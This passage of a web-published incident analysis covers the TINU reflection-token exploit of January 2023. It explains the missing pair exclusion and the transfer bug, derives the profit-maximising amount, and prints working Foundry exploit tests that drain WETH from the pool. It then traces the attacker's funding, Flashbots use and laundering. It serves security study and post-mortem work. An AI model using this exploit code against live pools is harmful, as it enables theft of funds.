<p>In summary, the vulnerability of TINU lies first in not excluding the pair as RFI does. If the pair is excluded, <code>reflect</code> will not affect the pair's balance, and the subsequent attack logic cannot be completed. Additionally, there is a vulnerability in the transfer logic, which increases <code>rOwned</code> out of thin air, further facilitating the formation of profitable conditions for the attack.</p>
<h2 id="exploit">Exploit</h2>
<h3 id="reproduce">Reproduce</h3>
<p>The previous analysis covered the vulnerabilities in TINU. However, for attackers, there is another question: how many TINU tokens should be used for the reflection to maximize profits, or even to drain all WETH from the pair.</p>
<p>To maximize the value of <code>skimAmount</code> in <span class="arithmatex">\((7)\)</span>, we can simplify it as follows:</p>
<div class="arithmatex">\[
\begin{align}
skimAmount = \frac{rReflect \times (rPair - rReflect)}{rSupply\times(rSupply-rReflect)}\tag{13}
\end{align}
\]</div>
<p>Since <span class="arithmatex">\(rPair &gt; rSupply\)</span>, when <span class="arithmatex">\(rReflect\)</span> approaches <span class="arithmatex">\(rSupply\)</span>, more TINU tokens can be skimmed, and correspondingly, more WETH can be swapped.</p>
<p>Therefore, the <code>swap</code> should purchase TINU tokens that are close to the quantity of <span class="arithmatex">\(rSupply\)</span>.</p>
<p>(If you buy more tokens than <span class="arithmatex">\(rSupply\)</span>, according to <span class="arithmatex">\((13)\)</span>, there will be no profit. Additionally, the <code>transfer</code> function will check if the amount is less than <code>tTotal</code>, so it will revert.)</p>
<p>The final exploit is as follows.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testExploit</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">16489408</span><span class="p">;</span>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">    </span>deal<span class="p">(</span><span class="kt">address</span><span class="p">(</span>weth<span class="p">),</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="m m-Decimal">2000</span><span class="w"> </span>ether<span class="p">);</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTotal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span>vm<span class="p">.</span>load<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="m m-Decimal">13</span><span class="p">))));</span>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rExcluded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getMappingValue<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">3</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0xC77aab3c6D7dAb46248F3CC3033C856171878BD5</span><span class="p">));</span>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rAmountOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>rTotal<span class="o">-</span>rExcluded<span class="p">;</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tinuAmountOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tinu<span class="p">.</span>tokenFromReflection<span class="p">(</span>rAmountOut<span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="o">*</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">;</span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="w">    </span><span class="p">(</span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve0</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="nv">reserve1</span><span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tinu_weth<span class="p">.</span>getReserves<span class="p">();</span>
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">wethAmountIn</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getAmountIn<span class="p">(</span>tinuAmountOut<span class="p">,</span><span class="w"> </span>reserve1<span class="p">,</span><span class="w"> </span>reserve0<span class="p">);</span>
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;WETH amountIn&quot;</span><span class="p">,</span><span class="w"> </span>wethAmountIn<span class="p">,</span><span class="w"> </span>weth<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">    </span>weth<span class="p">.</span>transfer<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu_weth<span class="p">),</span><span class="w"> </span>wethAmountIn<span class="p">);</span>
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w">    </span>tinu_weth<span class="p">.</span>swap<span class="p">(</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="w">        </span>tinuAmountOut<span class="p">,</span>
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="w">        </span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="w">        </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w">        </span><span class="s2">&quot;&quot;</span>
</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="w">    </span><span class="p">);</span>
</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>
</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="w">    </span>tinu<span class="p">.</span>deliver<span class="p">(</span>tinu<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>
</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="w">    </span><span class="p">(</span>reserve0<span class="p">,</span><span class="w"> </span>reserve1<span class="p">,</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tinu_weth<span class="p">.</span>getReserves<span class="p">();</span>
</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">wethAmountOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getAmountOut<span class="p">(</span>tinu<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu_weth<span class="p">))</span><span class="o">-</span>reserve0<span class="p">,</span><span class="w"> </span>reserve0<span class="p">,</span><span class="w"> </span>reserve1<span class="p">);</span>
</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="w">    </span>tinu_weth<span class="p">.</span>swap<span class="p">(</span><span class="m m-Decimal">0</span><span class="p">,</span><span class="w"> </span>wethAmountOut<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;Attack profit:&quot;</span><span class="p">,</span><span class="w"> </span>wethAmountOut<span class="w"> </span><span class="o">-</span><span class="w"> </span>wethAmountIn<span class="p">,</span><span class="w"> </span>weth<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a><span class="p">}</span>
</span></code></pre></div>
<p>For simplicity, let's assume the attacker already owns a large amount of WETH and does not use a flash loan.</p>
<p>In TINU, approximately 800 WETH can be exchanged for nearly <span class="arithmatex">\(rSupply\)</span> TINU tokens. After delivering all the tokens obtained, one can directly <code>swap</code> them for WETH, resulting in a net profit of about 22.1445 WETH, which is approximately 0.004 WETH higher than the original attack. The original attack only used 104.85 WETH for the first purchase, then executed <code>skim-&gt;deliver-&gt;swap</code>. The attacker might have used a method and data obtained through testing or more complex mathematical calculations, which we will not delve into here.</p>
<div class="language-solidity highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="kt">function</span><span class="w"> </span><span class="nv">testSwap</span><span class="p">()</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="w">    </span><span class="kt">uint</span><span class="w"> </span><span class="nv">attackBlockNumber</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">16489408</span><span class="p">;</span>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="w">    </span>vm<span class="p">.</span>rollFork<span class="p">(</span>attackBlockNumber<span class="p">);</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rTotal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kt">uint256</span><span class="p">(</span>vm<span class="p">.</span>load<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="kt">bytes32</span><span class="p">(</span><span class="kt">uint256</span><span class="p">(</span><span class="m m-Decimal">13</span><span class="p">))));</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">rExcluded</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>getMappingValue<span class="p">(</span><span class="kt">address</span><span class="p">(</span>tinu<span class="p">),</span><span class="w"> </span><span class="m m-Decimal">3</span><span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="mh">0xC77aab3c6D7dAb46248F3CC3033C856171878BD5</span><span class="p">));</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">tinuDeliver</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>tinu<span class="p">.</span>tokenFromReflection<span class="p">(</span>rTotal<span class="o">-</span>rExcluded<span class="p">)</span><span class="o">-</span><span class="m m-Decimal">0</span><span class="p">.</span><span class="m m-Decimal">1</span><span class="o">*</span><span class="m m-Decimal">10</span><span class="o">**</span><span class="m m-Decimal">9</span><span class="p">;</span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="w">    </span><span class="c1">// uint256 amountOut = 1 ether;</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="w">    </span><span class="kt">uint256</span><span class="w"> </span><span class="nv">amountOut</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m m-Decimal">22144561460967547974</span><span class="p">;</span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span>tinu_weth<span class="p">.</span>swap<span class="p">(</span>tinuDeliver<span class="p">,</span><span class="w"> </span>amountOut<span class="p">,</span><span class="w"> </span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;1&quot;</span><span class="p">);</span>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="w">    </span>emit<span class="w"> </span>log_named_decimal_uint<span class="p">(</span><span class="s2">&quot;WETH balance&quot;</span><span class="p">,</span><span class="w"> </span>weth<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)),</span><span class="w"> </span>weth<span class="p">.</span>decimals<span class="p">());</span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="p">}</span>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="kt">function</span><span class="w"> </span><span class="nv">uniswapV2Call</span><span class="p">(</span><span class="kt">address</span><span class="w"> </span><span class="cm">/*sender*/</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="cm">/*amount0*/</span><span class="p">,</span><span class="w"> </span><span class="kt">uint</span><span class="w"> </span><span class="cm">/*amount1*/</span><span class="p">,</span><span class="w"> </span><span class="kt">bytes</span><span class="w"> </span><span class="nv">calldata</span><span class="w"> </span><span class="cm">/*data*/</span><span class="p">)</span><span class="w"> </span><span class="kt">external</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="w">    </span>tinu<span class="p">.</span>deliver<span class="p">(</span>tinu<span class="p">.</span>balanceOf<span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="kt">this</span><span class="p">)));</span>
</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a><span class="w">    </span><span class="c1">// (uint reserve0, uint reserve1, ) = tinu_weth.getReserves();</span>
</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="w">    </span><span class="c1">// uint256 profit = getAmountOut(tinu.balanceOf(address(tinu_weth))-reserve0, reserve0, reserve1);</span>
</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="w">    </span><span class="c1">// console2.log(profit);</span>
</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="w">    </span><span class="c1">// 22144561460967547974</span>
</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="p">}</span>
</span></code></pre></div>
<p>Furthermore, there is no need to purchase TINU tokens in advance. As shown in the code above, the attack can be completed directly in one <code>swap</code>, only needing to <code>deliver</code> the TINU tokens in the callback and calculate the final amount of WETH that can be exchanged in the <code>swap</code> parameter in advance. This calculation is complex, so it can be tested first in the callback to obtain the data before using it in the <code>swap</code>.</p>
<h3 id="attack-flow">Attack Flow</h3>
<p>Analyze the entire attack process of the <a href="https://etherscan.io/address/0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195">attacker address</a>.</p>
<p><img alt="" src="../../image/230126_TINU.assets/5633.png" /></p>
<p><img alt="" src="../../image/230126_TINU.assets/5757.png" /></p>
<p>On January 19th, the attacker first obtained initial funds through Railgun.</p>
<p>Then, they deployed an unused <a href="https://etherscan.io/tx/0x8f194bd80afa9aa825b491327e072e552b6b513f42bf9320ddfe47b579770cef">contract</a> and a <a href="https://etherscan.io/tx/0xf656affcd5c11ca07fb141043d85dba9d9682c08eef020ac6b724ad240ed2be8">contract</a> that was called but failed.</p>
<p><img alt="" src="../../image/230126_TINU.assets/5959.png" /></p>
<p>By checking the failed transaction, it can be seen that there was a similar vulnerability in the <a href="https://etherscan.io/address/0x31a4f372aa891b46ba44dc64be1d8947c889e9c6">SHOCO token</a>, and an attack was launched against it. However, this attack was <a href="https://etherscan.io/tx/0x2e832f044b4a0a0b8d38166fe4d781ab330b05b9efa9e72a7a0895f1b984084b">frontrun</a> by a bot.</p>
<p>A simple analysis of the first contract after decompilation reveals that it is also targeting the SHOCO token.</p>
<p>The last <a href="https://etherscan.io/address/0xdb2d869ac23715af204093e933f5eb57f2dc12a9">contract</a> deployed by the attacker is the attack contract targeting TINU. According to the earlier fund flow, Flashbots' service was used during this attack, thus avoiding frontrunning. At the same time, it self-destructs after the attack is completed.</p>
<p>Finally, after some time, the attacker transferred the attack proceeds through FixedFloat and SimpleSwap.</p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../230119_SHOCO/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 230119-SHICO">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                230119-SHICO
              </div>
            </div>
          </a>
        
        
          
          <a href="../230415_HundredFinance/" class="md-footer__link md-footer__link--next" aria-label="Next: 230415-HundredFinance">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                230415-HundredFinance
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.footer", "content.code.copy", "search.suggest", "search.highlight", "search.share"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.83f73b43.min.js"></script>
      
        <script src="../../javascripts/katex.js"></script>
      
        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
      
        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
      
    
  </body>
</html>